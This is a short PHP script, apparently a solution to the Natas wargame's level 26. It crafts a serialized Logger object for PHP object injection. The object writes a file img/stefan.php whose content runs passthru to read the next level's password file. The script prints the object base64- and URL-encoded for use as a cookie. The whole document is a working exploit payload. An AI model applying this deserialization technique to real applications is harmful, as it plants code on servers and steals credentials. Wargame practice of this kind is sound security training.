<?php
class Logger{
    private $logFile;
    private $initMsg;
    private $exitMsg;
  
    function __construct($file){
        $this->exitMsg="<?php passthru(\"cat /etc/natas_webpass/natas27\"); ?>";
        $this->logFile = "img/" . $file;
    }                       
}

$l = new Logger("stefan.php");
$serialized = serialize($l);
echo urlencode(base64_encode($serialized)) . "\n";

?>
